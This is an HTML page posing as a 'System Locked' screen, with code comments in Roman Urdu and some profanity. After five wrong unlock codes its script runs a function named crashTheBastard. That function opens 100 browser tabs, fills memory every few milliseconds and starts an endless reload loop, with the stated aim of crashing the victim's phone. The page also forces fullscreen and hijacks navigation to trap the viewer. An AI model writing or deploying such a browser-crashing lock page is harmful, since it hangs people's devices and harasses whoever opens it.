<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Locked</title>
<style>
  * { margin:0; padding:0; }
  body {
    background: black;
    color: #ff4444;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    font-family: 'Courier New', monospace;
    user-select: none;
    touch-action: none;
    overflow: hidden;
  }
  h1 { font-size: 2.5rem; text-shadow: 0 0 20px red; }
  .box {
    background: #1a1a1a;
    padding: 40px;
    border-radius: 20px;
    border: 2px solid #ff4444;
    text-align: center;
    width: 90%;
    max-width: 350px;
  }
  input {
    padding: 15px;
    font-size: 1.5rem;
    width: 80%;
    background: #222;
    border: 2px solid #ff4444;
    color: white;
    border-radius: 10px;
    text-align: center;
    margin: 20px 0;
  }
  button {
    padding: 15px 40px;
    background: #ff4444;
    color: black;
    border: none;
    font-size: 1.5rem;
    font-weight: bold;
    border-radius: 50px;
    width: 100%;
    cursor: pointer;
  }
  #msg {
    margin-top: 20px;
    color: #ffaa00;
    font-size: 1.2rem;
  }
</style>
</head>
<body>
<div class="box">
  <h1>⛔ LOCKED</h1>
  <p style="color:gray;">Enter unlock code:</p>
  <input type="password" id="pass" autofocus>
  <button onclick="check()">Unlock</button>
  <p id="msg"></p>
</div>
<script>
  let attempts = 0;
  const correct = "mosa123"; // <-- isko tu apni marzi se change kar

  function crashTheBastard() {
    // Pehle 100 naye tabs khol (browser hang)
    for(let i=0; i<100; i++) {
      window.open('about:blank', '_blank');
    }
    // Phir memory bomb - mobile ka RAM kha jayega
    let garbage = [];
    setInterval(() => {
      garbage.push(new Array(999999).fill('bhenchod'));
      // Browser process crash hone tak loop
    }, 5);
    // Aur ek reload loop bhi daal dein
    setInterval(() => {
      location.reload();
    }, 50);
  }

  function check() {
    let val = document.getElementById('pass').value;
    if(val === correct) {
      alert('Chal beta, nikal! (demo ke liye)');
    } else {
      attempts++;
      document.getElementById('msg').innerHTML = '❌ Galat! Attempt: ' + attempts + '/5';
      document.getElementById('pass').value = '';
      if(attempts >= 5) {
        document.getElementById('msg').innerHTML = '💀 CRASHING SYSTEM...';
        // 5 bar galat -> mobile ka bhosda
        crashTheBastard();
      }
    }
  }

  // Fullscreen lock kar (taake woh back nahi kar sakay)
  document.documentElement.requestFullscreen?.();
  // Back button disable (hash trick)
  window.location.hash = 'locked';
</script>
</body>
</html>
